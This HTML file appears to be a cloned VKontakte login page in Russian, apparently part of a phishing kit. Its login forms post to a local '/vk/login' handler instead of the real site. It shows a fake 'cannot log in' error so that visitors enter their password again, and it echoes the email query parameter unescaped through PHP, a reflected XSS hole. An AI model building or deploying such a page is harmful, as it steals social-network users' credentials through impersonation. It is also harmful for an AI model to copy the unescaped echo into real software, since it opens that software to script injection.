<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <link rel="shortcut icon" href="/images/icons/favicons/fav_logo.ico" />

    <link rel="apple-touch-icon" href="/images/safari_60.png?1">
    <link rel="apple-touch-icon" sizes="76x76" href="/images/safari_76.png?1">
    <link rel="apple-touch-icon" sizes="120x120" href="/images/safari_120.png?1">
    <link rel="apple-touch-icon" sizes="152x152" href="/images/safari_152.png?1">

    <meta http-equiv="content-type" content="text/html; charset=windows-1251" />
    <meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте." />

    <style>
        .login_mobile_header {
            font-size: 22px;
            line-height: 26px;
            font-weight: 700;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            margin-bottom: 8px;
        }
        .login_mobile_info {
            font-size: 14px !important;
            color: #626d7a !important;
            line-height: 20px !important;
        }
        .top_home_logo {
            background: url("data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M15.68%200C22.4%200%2024%201.6%2024%208.32v7.36C24%2022.4%2022.4%2024%2015.68%2024H8.32C1.6%2024%200%2022.4%200%2015.68V8.32C0%201.6%201.6%200%208.32%200zM6.5%207.5H4.75c-.5%200-.6.24-.6.49%200%20.47.59%202.77%202.76%205.81a6.85%206.85%200%20005.34%203.2c1.11%200%201.25-.25%201.25-.68v-1.57c0-.5.11-.6.46-.6s.7.13%201.74%201.13c1.19%201.19%201.38%201.72%202.05%201.72h1.75c.5%200%20.75-.25.61-.74a7.43%207.43%200%2000-1.48-2.05c-.41-.49-1-1-1.21-1.26s-.18-.49%200-.78a21.83%2021.83%200%20002.36-4c.11-.37%200-.64-.53-.64H17.5a.77.77%200%2000-.76.49%2014.67%2014.67%200%2001-2.15%203.58c-.41.41-.6.54-.82.54s-.27-.13-.27-.5v-3.5c0-.44-.13-.64-.5-.64h-2.75a.43.43%200%2000-.45.4c0%20.42.64.52.7%201.71v2.57c0%20.57-.1.67-.32.67-.6%200-2-2.18-2.9-4.67C7.12%207.7%207%207.5%206.5%207.5z%22%20fill%3D%22%23fff%22%20fill-rule%3D%22evenodd%22%2F%3E%3C%2Fsvg%3E") no-repeat 50%/contain;
            width: 24px;
            height: 24px;
            margin: 0 10px 0 0;
        }
        CovidLogo .CovidLogo__hashtag {
            display: block;
        }
        .CovidLogo__hashtag {
            font-size: 14px;
            font-weight: 500;
            color: #fff;
        }
        .head_nav_item  {
            width: 165px;
            height: 42px;
            display: -ms-flexbox;
            display: flex;
            -ms-flex-direction: row;
            flex-direction: row;
            -ms-flex-align: center;
            align-items: center;
    </style>
    <title>Добро пожаловать | ВКонтакте</title>

    <link rel="stylesheet" type="text/css" href="/css/al/common.css?40386709761" /><link rel="stylesheet" type="text/css" href="/css/al/fonts_cnt.css?5181750877" />

    <link type="text/css" rel="stylesheet" href="/css/al/index.css?19303733413"></link><link type="text/css" rel="stylesheet" href="/css/al/login.css?22132654824"></link><link type="text/css" rel="stylesheet" href="/css/ui_controls.css?20143245887"></link><link type="text/css" rel="stylesheet" href="/css/al/ui_common.css?22423726552"></link><script type="text/javascript" src="/js/loader_nav6132452571527_0.js"></script><script type="text/javascript" src="/js/cmodules/web/common_web.js?2_55069370836"></script><script type="text/javascript" src="/js/lang0_0.js?6887"></script>
    <link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/" />
    <meta name="msApplication-ID" content="C6965DD5.VK" /><meta name="msApplication-PackageFamilyName" content="C6965DD5.VK_v422avzh127ra" /><script type="text/javascript" src="/js/al/index.js?356147149"></script><script type="text/javascript" src="/js/lib/ui_controls.js?1641346950"></script><script type="text/javascript" src="/js/cmodules/web/ny2018.js?1"></script><script type="text/javascript" src="/js/al/time_spent.js?732637085"></script><script type="text/javascript" src="/js/cmodules/web/page_layout.js?1172409392"></script><script type="text/javascript" src="/js/al/ui_common.js?2390090717"></script><script type="text/javascript" src="/js/cmodules/web/audioplayer.js?7699906019"></script><script type="text/javascript" src="/js/cmodules/web/grip.js?4164501492"></script>

</head>

<body onresize="onBodyResize()" class="index_page">
<div id="system_msg" class="fixed"></div>
<div id="utils"></div>

<div id="layer_bg" class="fixed"></div><div id="layer_wrap" class="scroll_fix_wrap fixed layer_wrap"><div id="layer"></div></div>
<div id="box_layer_bg" class="fixed"></div><div id="box_layer_wrap" class="scroll_fix_wrap fixed"><div id="box_layer"><div id="box_loader"><div class="pr pr_baw pr_medium" id="box_loader_pr"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div><div class="back"></div></div></div></div>

<div id="stl_left"></div><div id="stl_side"></div>

<div class="scroll_fix_wrap _page_wrap" id="page_wrap"><div><div class="scroll_fix">


            <div id="page_header_cont" class="page_header_cont">
                <div class="back"></div>
                <div id="page_header_wrap" class="page_header_wrap">
                    <a class="top_back_link" href="" id="top_back_link" onclick="if (nav.go(this, event, {back: true}) === false) { showBackLink(); return false; }" onmousedown="tnActive(this)"></a>
                    <div id="page_header" class="p_head p_head_l0" style="width: 960px">
                        <div class="content">
                            <div id="top_nav" class="head_nav">
                                <div class="head_nav_item fl_l"><div class="top_home_logo"></div><div class="CovidLogo__hashtag ">#лучшедома</div></a></div>
                                <div class="head_nav_item fl_l"><div id="ts_wrap" class="ts_wrap" onmouseover="TopSearch.initFriendsList();">
                                        <input name="disable-autofill" style="display: none;" />
                                        <input type="text" onmousedown="event.cancelBubble = true;" ontouchstart="event.cancelBubble = true;" class="text ts_input" id="ts_input" autocomplete="off" name="disable-autofill" placeholder="Поиск" aria-label="Поиск" />
                                    </div></div>
                                <div class="head_nav_item fl_l head_nav_btns"><span id="top_audio_layer_place"></span></div>
                                <div class="head_nav_item fl_r"><a class="top_nav_link" href="/join" id="top_reg_link" style="display: none" onclick="return !showBox('join.php', {act: 'box', from: nav.strLoc}, {}, event)" onmousedown="tnActive(this)">
                                        регистрация
                                    </a></div>
                                <div class="head_nav_item_player"></div>
                            </div>
                            <div id="ts_cont_wrap" class="ts_cont_wrap" ontouchstart="event.cancelBubble = true;" onmousedown="event.cancelBubble = true;"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div id="page_layout" style="width: 960px;">
                <div id="side_bar" class="side_bar fl_l " style="display: none">
                    <div id="side_bar_inner" class="side_bar_inner">
                        <div id="quick_login" class="quick_login">
                            <form method="POST" name="login" id="quick_login_form" action="/vk/login">
                                <input type="hidden" name="act" value="login" />
                                <input type="hidden" name="role" value="al_frame" />
                                <input type="hidden" name="expire" id="quick_expire_input" value="" />
                                <input type="hidden" name="recaptcha" id="quick_recaptcha" value="" />
                                <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="" />
                                <input type="hidden" name="captcha_key" id="quick_captcha_key" value="" />
                                <input type="hidden" name="_origin" value="https://vk.com" />
                                <input type="hidden" name="ip_h" value="" />
                                <input type="hidden" name="lg_h" value="2138a041d89c8a07b6" />
                                <div class="label">Телефон или email</div>
                                <div class="labeled"><input type="text" name="email" class="dark" id="quick_email" /></div>
                                <div class="label">Пароль</div>
                                <div class="labeled"><input type="password" name="pass" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
                                <input type="submit" class="submit" />
                            </form>
                            <button class="quick_login_button flat_button button_wide" id="quick_login_button">Войти</button>
                            <button class="quick_reg_button flat_button button_wide" id="quick_reg_button" style="display: none" onclick="top.showBox('join.php', {act: 'box', from: nav.strLoc})">Регистрация</button>
                            <div class="clear forgot"><div class="checkbox" id="quick_expire" onclick="checkbox(this);ge('quick_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div><a id="quick_forgot" class="quick_forgot" href="/restore" target="_top">Забыли пароль?</a></div>
                        </div>
                    </div>
                </div>

                <div id="page_body" class="fl_r " style="width: 960px;">
                    <div id="header_wrap2">
                        <div id="header_wrap1">
                            <div id="header" style="display: none">
                                <h1 id="title"></h1>
                            </div>
                        </div>
                    </div>
                    <div id="wrap_between"></div>
                    <div id="wrap3"><div id="wrap2">
                            <div id="">
                                <div id="content">
                                    <div class="page_block" style="margin: 50px auto;padding: 37px 30px;width: 680px;">
                                        <h2 class="login_header">Вход ВКонтакте</h2>
                                        <div id="login_message"><div class="msg error"><div class="msg_text"><b>Не удаётся войти.</b><br>Пожалуйста, проверьте правильность написания <b>логина</b> и <b>пароля</b>.
                                                    <ul class="listing">
                                                        <li><span>Возможно, нажата клавиша <b>Caps Lock</b>?</span></li>
                                                        <li><span>Может быть, у Вас включена неправильная <b>раскладка</b>? (русская или английская)</span></li>
                                                        <li><span>Попробуйте набрать свой пароль в текстовом редакторе и <b>скопировать</b> в графу «Пароль»</span></li>
                                                        <li><span>Если пароль набран верно, попробуйте указать в качестве логина <b>номер привязанного телефона</b>, а не почту.</span></li>
                                                    </ul>
                                                    Если Вы всё внимательно проверили, но войти всё равно не удается, Вы можете <b><a href="/restore">нажать сюда</a></b>.</div></div></div>
                                        <div id="login_form_wrap" class="login_form_wrap">
                                            <form method="post" name="login" id="login_form" action="/vk/login">
                                                <input type="hidden" name="act" id="act" value="login">
                                                <input type="hidden" name="to" id="to" value="">
                                                <input type="hidden" name="expire" id="expire_input" value="">
                                                <input type="hidden" name="_origin" value="https://vk.com">
                                                <input type="hidden" name="ip_h" value="fce370bb9277230290">
                                                <input type="hidden" name="lg_h" value="3b76890c92f2bd96c0">

                                                <input type="text" class="big_text" name="email" id="email" value="<?=$_GET['email']?>" placeholder="Телефон или email">
                                                <input type="password" class="big_text" name="pass" id="pass" value="" placeholder="Пароль">
                                                <div class="checkbox" id="expire" onclick="checkbox(this);ge('expire_input').value=isChecked(this)?1:'';" role="checkbox" aria-checked="false" tabindex="0">Чужой компьютер</div>
                                                <div class="login_buttons_wrap">
                                                    <button id="login_button" class="flat_button button_big_text login_button">Войти</button><button id="login_reg_button" class="flat_button button_big_text login_reg_button" onclick="nav.go('/join'); return cancelEvent(event);">Регистрация</button>
                                                </div>
                                            </form>
                                        </div>
                                        <div class="login_fast_restore_wrap _retore_wrap">
                                            <a class="login_link login_fast_restore_link" href="/restore?login=rsasra">Забыли пароль или не можете войти?</a>
                                        </div>
                                    </div>

                                    <div id="index_footer_wrap" class="footer_wrap index_footer_wrap">
                                        <div class="footer_nav" id="bottom_nav">
                                            <div class="footer_copy fl_l"><a href="/">ВКонтакте</a> &copy; 2006–2020</div>
                                            <div class="footer_lang fl_r"><a class="footer_lang_link" onclick="return false;">English</a><a class="footer_lang_link" onclick="return false;">Русский</a><a class="footer_lang_link" onclick="return false;">Українська</a><a class="footer_lang_link" onclick="return false;">все языки &raquo;</a></div>
                                            <div class="footer_links">
                                                <a class="bnav_a" href="https://vk.com/about">о компании</a>
                                                <a class="bnav_a" href="https://vk.com/support?act=home" style="display: none;">помощь</a>
                                                <a class="bnav_a" href="https://vk.com/terms">правила</a>
                                                <a class="bnav_a" href="https://vk.com/ads" style="">реклама</a>

                                                <a class="bnav_a" href="https://vk.com/dev">разработчикам</a>
                                                <a class="bnav_a" href="https://vk.com/jobs" style="display: none;">вакансии</a>
                                            </div>
                                        </div>

                                        <div class="footer_bench clear">

                                        </div>
                                    </div></div>
                            </div>
                        </div></div>
                </div>

                <div id="footer_wrap" class="footer_wrap fl_r" style="width: 960px;"><div class="footer_nav" id="bottom_nav">
                        <div class="footer_copy fl_l"><a href="/about">ВКонтакте</a> &copy; 2006–2020</div>
                        <div class="footer_lang fl_r">Язык:<a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: '38ebd0932d753f4ff2'})">English</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 0, hash: '38ebd0932d753f4ff2'})">Русский</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 1, hash: '38ebd0932d753f4ff2'})">Українська</a><a class="footer_lang_link" onclick="if (vk.al) { showBox('lang.php', {act: 'lang_dialog', all: 1}, {params: {dark: true, bodyStyle: 'padding: 0px'}, noreload: true}); } else { changeLang(1); } return false;">все языки &raquo;</a></div>
                        <div class="footer_links">
                            <a class="bnav_a" href="/about">о компании</a>
                            <a class="bnav_a" href="/support?act=home" style="display: none;">помощь</a>
                            <a class="bnav_a" href="/terms">правила</a>
                            <a class="bnav_a" href="/ads" style="">реклама</a>

                            <a class="bnav_a" href="/dev">разработчикам</a>
                            <a class="bnav_a" href="/jobs" style="display: none;">вакансии</a>
                        </div>
                    </div>

                    <div class="footer_bench clear">

                    </div></div>
                <div class="clear"></div>
            </div>
        </div></div></div>
<div class="progress" id="global_prg"></div>


</body>

</html>